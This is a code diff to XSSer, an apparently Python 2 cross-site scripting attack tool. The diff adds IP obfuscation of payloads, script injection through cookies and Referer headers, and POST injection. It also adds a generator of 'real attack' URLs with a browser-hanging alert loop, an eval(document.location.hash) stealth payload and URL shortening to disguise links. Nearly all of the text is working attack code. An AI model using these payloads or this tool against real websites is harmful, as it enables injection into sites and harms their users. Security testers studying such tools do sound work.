@@ -8,6 +8,7 @@ from .encdec import EncoderDecoder
 from .options import XSSerOptions
 from .dork import Dorker
 from .crawler import Crawler
+from .post.shorter import ShortURLReservations
 
 # set to emit debug messages about errors.
 DEBUG = 1
@@ -23,10 +24,9 @@ class XSSer(EncoderDecoder):
         # your unique real opponent
         self.time = datetime.datetime.now()
 
-        # DEFAULT_XSS = '"><img src=x onerror=alert(1);>'
         # this payload comes with vector already..
+        #self.DEFAULT_XSS_PAYLOAD = '"><img src=x onerror=alert('XSS');>'
         self.DEFAULT_XSS_PAYLOAD = '"><script>alert("XSS")</script>'
-        #self.DEFAULT_XSS_VECTOR = '">PAYLOAD'
 
         # to be or not to be...
         self.hash_found = []
@@ -35,6 +35,14 @@ class XSSer(EncoderDecoder):
         # xsser verbosity (0 - no output, 1 - dots only, 2+ - real verbosity)
         self.verbose = 2
         self.options = None
+
+	# define some stadistics counters  
+	self.success_connection = 0
+	self.not_connection = 0 
+	self.forwarded_connection = 0
+	self.other_connection = 0
+	self.total_vectors = 0
+        self.other_injections = 0 
 
     def generate_hash(self, attack_type='default'):
         """
@@ -52,7 +60,7 @@ class XSSer(EncoderDecoder):
             prefix = ""
             if level != 'info':
                 prefix = "["+level+"] "
-            print prefix + msg
+            print msg
         elif self.verbose:
             if level == 'error':
                 sys.stdout.write("*")
@@ -90,7 +98,7 @@ class XSSer(EncoderDecoder):
             payloads = fuzzing.vectors.vectors
         
         elif options.script:
-            payloads = [options.script]
+            payloads = [{"payload":options.script, "browser":"[try :-P]"}]
 
         else:
             payloads = [
@@ -101,22 +109,44 @@ class XSSer(EncoderDecoder):
 
     def process_ipfuzzing(self, text):
         """
-        Mask ips in given text
+        Mask ips in given text to DWORD
         """
         ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
         for ip in ips:
             text = text.replace(ip, str(self._ipDwordEncode(ip)))
         return text
 
+    def process_ipfuzzing_octal(self, text):
+        """
+	Mask ips in given text to Octal
+	"""
+        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
+        for ip in ips:
+            text = text.replace(ip, str(self._ipOctalEncode(ip)))
+        return text
+
     def process_payloads_ipfuzzing(self, payloads):
         """
-        Mask ips for all given payloads
+        Mask ips for all given payloads using DWORD
         """
-        # ip fuzzing
+        # ip fuzzing (DWORD)
         if self.options.Dwo:
             resulting_payloads = []
             for payload in payloads:
                 payload["payload"] = self.process_ipfuzzing(payload["payload"])
+                resulting_payloads.append(payload)
+            return resulting_payloads
+        return payloads
+
+    def process_payloads_ipfuzzing_octal(self, payloads):
+        """ 
+        Mask ips for all given payloads using OCTAL
+        """
+        # ip fuzzing (OCTAL)
+        if self.options.Doo:
+            resulting_payloads = []
+            for payload in payloads:
+                payload["payload"] = self.process_ipfuzzing_octal(payload["payload"])
                 resulting_payloads.append(payload)
             return resulting_payloads
         return payloads
@@ -127,6 +157,8 @@ class XSSer(EncoderDecoder):
         """
         if self.options.postdata:
             return self.options.postdata
+        elif self.options.getdata:
+            return self.options.getdata
         return ""
 
     def attack_url(self, url, payloads, query_string):
@@ -136,7 +168,7 @@ class XSSer(EncoderDecoder):
         for payload in payloads:
             self.attack_url_payload(url, payload, query_string)
 
-    def attack_url_payload(self, url, payload, query_string):
+    def get_url_payload(self, url, payload, query_string, attack_payload=None):
         """
         Attack the given url with the given payload
         """
@@ -152,8 +184,14 @@ class XSSer(EncoderDecoder):
 
         # substitute the attack hash
         orig_hash = self.generate_hash('url')
+        self.report("[+] \033[1;31mHashing:\033[1;m " + orig_hash)
         hashed_payload = payload_string.replace('XSS', orig_hash)
-        hashed_vector_url = self.encoding_permutations(hashed_payload)
+        if attack_payload:
+            # url for real attack
+            hashed_vector_url = self.encoding_permutations(attack_payload)
+        else:
+            # test
+            hashed_vector_url = self.encoding_permutations(hashed_payload)
 
         self._ongoing_attacks['url'] = hashed_payload
         
@@ -163,26 +201,36 @@ class XSSer(EncoderDecoder):
         else:
             payload_url = query_string.strip() + hashed_vector_url
             dest_url = url.strip() + "/" + payload_url
+        return dest_url
 
-        self._prepare_extra_attacks()
+    def attack_url_payload(self, url, payload, query_string):
 
-        c = Curl()
+        c= Curl()
         try:
-            c.get(dest_url) 
+            if self.options.getdata or not self.options.postdata:
+                dest_url = self.get_url_payload(url, payload, query_string)
+                self._prepare_extra_attacks()
+                c.get(dest_url)
+            if self.options.postdata:
+                dest_url = self.get_url_payload("", payload, query_string)
+                dest_url = dest_url.strip().replace("/", "", 1)
+                c.post(url, dest_url)
         except:
             if DEBUG:
                 traceback.print_exc()
             self.report("Error attacking: " + dest_url, "error")
             c.close()
             return
-        self.report("[+] \033[1;31mHashing:\033[1;m " + orig_hash)
+        
         if c.info()["http-code"] == "200":
-            self.check_positive(c, dest_url, hashed_payload, query_string)
+            if self.options.statistics:
+                self.success_connection = self.success_connection + 1
+            #self.check_positive(c, dest_url, hashed_payload, query_string)
             self._report_attack_success(c, dest_url, payload,
-                                        query_string)
+                                        query_string, url)
         else:
             self._report_attack_failure(c, dest_url, payload,
-                                        query_string)
+                                        query_string, url)
         c.close()
 
     def encoding_permutations(self, enpayload_url):
@@ -201,7 +249,7 @@ class XSSer(EncoderDecoder):
         return enpayload_url
 
     def _report_attack_success(self, curl_handle, dest_url, payload,
-                               attack_vector):
+                               query_string, orig_url):
         """
         report success of an attack
         """
@@ -214,49 +262,51 @@ class XSSer(EncoderDecoder):
             self.report("[+] \033[1;35mBrowser Support:\033[1;m" + payload['browser'])
     
         if options.verbose:
-            self.report("[-] \033[1;36mHeaders Results:\033[1;m")
-            #self.report(curl_handle.info())
+            self.report("[-] \033[1;36mHeaders Results:\033[1;m\n")
+            self.report(curl_handle.info())
 
-            self.report("[-] \033[1;36mInjection Results:\033[1;m")
+            self.report("[-] \033[1;31mInjection Results:\n\033[1;m")
  
         # check attacks success
         for attack_type in self._ongoing_attacks:
             hashing = self._ongoing_attacks[attack_type]
             if hashing in curl_handle.body():
-                self.add_success(dest_url, payload, hashing, attack_type)
+                self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
             else:
-                self.add_failure(dest_url, payload, hashing, attack_type)
+                self.add_failure(dest_url, payload, hashing, query_string, attack_type)
             
-    def add_failure(self, dest_url, payload, hashing, method='url'):
+    def add_failure(self, dest_url, payload, hashing, query_string, method='url'):
         """
         Add an attack that failed to inject
         """
         self.report("[+] \033[1;36mChecking:\033[1;m " + method + " attack with " + hashing + "... fail")
         options = self.options
         if options.script:
-            self.hash_notfound.append((dest_url, "Manual injection", method))
+            self.hash_notfound.append((dest_url, "Manual injection", method, hashing))
         else:
-            self.hash_notfound.append((dest_url, payload['browser'], method))
+            self.hash_notfound.append((dest_url, payload['browser'], method, hashing))
         if options.verbose:
             self.report("Searching hash: " + hashing + " in target source code...\n")
             self.report("Injection failed!. Hash not found...\n")
 
-    def add_success(self, dest_url, payload, hashing, method='url'):
+    def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
         """
         Add an attack that managed to inject the code
         """
-        self.report("[+] \033[1;36mChecking\033[1;m " + method + " attack with " + hashing + "... ok")
+	self.report("[+] \033[1;36mChecking:\033[1;m " + method + " attack with " + hashing + "... ok")
+	if self.options.xsa or self.options.xsr or self.options.coo:
+            self.other_injections = self.other_injections +1
         if self.options.script:
-            self.hash_found.append((dest_url, "Manual injection", method))
+            self.hash_found.append((dest_url, "Manual injection", method, hashing, query_string, payload, orig_url))
         else:
-            self.hash_found.append((dest_url, payload['browser'], method))
+            self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
  
         if self.options.verbose:
             self.report("Searching hash: " + hashing + " in target source code...\n")
             self.report("Seems that this injection was a success!! :)\n")
 
     def _report_attack_failure(self, curl_handle, dest_url, payload,
-                               attack_vector):
+                               attack_vector, orig_url):
         """
         report failure of an attack
         """
@@ -274,13 +324,21 @@ class XSSer(EncoderDecoder):
             self.report("[+] \033[1;35mBrowser Support:\033[1;m " + payload['browser'])
         
         if options.verbose:
-            self.report("[-] \033[1;36mHeaders Results:\033[1;m")
+            self.report("[-] \033[1;36mHeaders Results:\033[1;m\n")
             self.report(str(curl_handle.info()))
           
             self.report("[-] \033[1;36mInjection Results:\033[1;m)")
                 
         self.report("Not injected!. Servers response with http-code different \
                     to: 200 OK (" + str(curl_handle.info()["http-code"]) + ")")
+
+	if self.options.statistics:
+	    if str(curl_handle.info()["http-code"]) == "400":
+                self.not_connection = self.not_connection + 1
+            elif str(curl_handle.info()["http-code"]) == "503":
+                self.forwarded_connection = self.forwarded_connection + 1
+	    else:
+                self.other_connection = self.other_connection + 1
 
     def check_positive(self, curl_handle, dest_url, payload, attack_vector):
         """
@@ -334,7 +392,8 @@ class XSSer(EncoderDecoder):
             self.report('='*75)
             dorker = Dorker(options.dork_engine)
             urls = dorker.dork(options.dork)
-        if options.crawling:
+        
+	if options.crawling:
             # XXX should check crawling parameter validity
             crawler_urls = []
             crawler = Crawler()
@@ -373,18 +432,19 @@ class XSSer(EncoderDecoder):
         urls = self.try_running(self._get_attack_urls, "Internal error getting urls")
         # step 2: get payloads
         payloads = self.try_running(self.get_payloads, "Internal error getting payloads")
-        payloads = self.process_payloads_ipfuzzing(payloads)
-
+	if options.Dwo:
+            payloads = self.process_payloads_ipfuzzing(payloads)
+	elif options.Doo:
+	    payloads = self.process_payloads_ipfuzzing_octal(payloads)
         # step 3: get query string
         query_string = self.try_running(self.get_query_string, "Internal error getting query string")
-
         # step 4: print curl options if requested
         if options.verbose:
             Curl.print_options()
- 
         # step 5: perform attack
         self.try_running(self.attack, "Internal error running attack", (urls, payloads, query_string))
-
+	if options.statistics:
+            self.total_vectors = self.total_vectors + 1
         # step 6: print results
         self.print_results()
 
@@ -402,7 +462,11 @@ class XSSer(EncoderDecoder):
             hashing = self.generate_hash('xsr');
             Curl.referer = "<script>alert('" + hashing + "')</script>"
             self._ongoing_attacks['xsr'] = hashing
-
+	
+	if options.coo:
+            hashing = self.generate_hash('cookie');
+	    Curl.cookie = "<script>alert('" + hashing + "')</script>"
+	    self._ongoing_attacks['cookie'] = hashing
 
     def attack(self, urls, payloads, query_string):
         """
@@ -415,31 +479,92 @@ class XSSer(EncoderDecoder):
             self.report('='*75 + "\n")
             self.attack_url(url, payloads, query_string)
 
+    def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
+        """
+        Generate a real attack url, by using data from a successfull test run, but setting
+	a real attack payload.
+
+	This method also applies DOM stealth mechanisms.
+        """
+	user_attack_payload = "alert('XSS')"
+        if self.options.finalpayload:
+            user_attack_payload = self.options.finalpayload
+	if self.options.dos:
+            user_attack_payload = 'for(;;)alert("You was XSSed!!");'		
+        do_anchor_payload = self.options.anchor
+        anchor_data = None
+	if do_anchor_payload:
+            attack_payload = "<script>eval(document.location.hash)</script>"
+            anchor_data = user_attack_payload
+	else:
+            attack_payload = "<script>" + user_attack_payload + "</script>"
+        dest_url = self.get_url_payload(orig_url, payload, query_string, attack_payload)
+	if anchor_data:
+            # XXX attack_payload probably needs to be escaped
+            dest_url += '#' + anchor_data
+        return dest_url
+
+    def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
+        real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
+        generate_shorturls = self.options.shorturls
+        if generate_shorturls:
+            shortener = ShortURLReservations(self.options.shorturls)
+	    shorturl = shortener.process_url(dest_url)
+            print "[*] Shortered url:", shorturl
+        return real_attack_url
+
     def print_results(self):
         """
         Print results from an attack.
         """
-        print "\n"
+	# some bad situations:
+	if len(self.hash_found) + len(self.hash_notfound) == 0:
+            print "\n...is -something- blocking our connections!!?\n"
         print '='*75
         print "[*] \033[1;37mFinal Results:\033[1;m"
         print '='*75 + '\n'
-
-        print "- Total:", len(self.hash_found) + len(self.hash_notfound)
+	total_injections = len(self.hash_found) + len(self.hash_notfound)
+        print "- Injections:", total_injections
         print "- Failed:", len(self.hash_notfound)
-        print "- Sucessfull:", len(self.hash_found) , '\n'
+        print "- Sucessfull:", len(self.hash_found)
+	print "- Accur:" , (len(self.hash_found) * 100) / total_injections, '%' , '\n'
         print '='*75
+	# some stadistics reports
+	if self.options.statistics:
+            print "[*] \033[1;37mStadistics:\033[1;m"
+	    print '='*75
+	    test_time = datetime.datetime.now() - self.time
+	    print "\nTest Time Duration:", test_time
+	    print '-'*50
+	    total_connections = self.success_connection + self.not_connection + self.forwarded_connection + self.other_connection
+	    print "Connections:", total_connections
+	    print "200-OK:" , self.success_connection , "|",  "400:" , self.not_connection , "|" , "503:" , self.forwarded_connection , "|" , "Others:", self.other_connection
+	    print "Accur:" , (self.success_connection * 100) / total_connections, '%'
+            print '-'*50
+	    print "Injections:" , total_injections
+	    print "Vectors:" , total_injections - self.other_injections , "|" , "Specials:" , self.other_injections
+	    print '-'*50
+	    print "Sucessfull:" , len(self.hash_found) , "|" , "Failed:" , len(self.hash_notfound)
+	    print "Accur:" , (len(self.hash_found) * 100) / total_injections, '%' , '\n' 
+            print '='*75
         print "[*] \033[1;37mList of possible XSS injections:\033[1;m"
         print '='*75 + '\n'
 
         for line in self.hash_found:
             print "[+] Url:", "\033[1;34m",line[0],"\033[1;m"
+            attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
+	    if not attack_url == line[0]:
+                print "[+] Attack url:", attack_url
             print "[-] Browsers:", line[1]
             print "[-] Method:", line[2]
+            # XXX real attacks should be generated before doing the following
             if self.options.fileoutput:
                 fout = open("XSSlist.dat", "a")
                 fout.write("-------------" + "\n")
-                fout.write("[*] Target:" + url + "\n")
+                fout.write("[*] Target:" + line[6] + "\n")
                 fout.write("[+] Url:" + line[0] + "\n")
+	        if not attack_url == line[0]:
+                    fout.write("[+] Attack Url:" + attack_url + "\n")
                 fout.write("[-] Browsers:"+ line[1] + "\n")
                 fout.write("-------------" + "\n")
             print '='*15
@@ -459,5 +584,3 @@ if __name__ == "__main__":
         sys.exit()
     app.set_options(options)
     app.run()
-
-
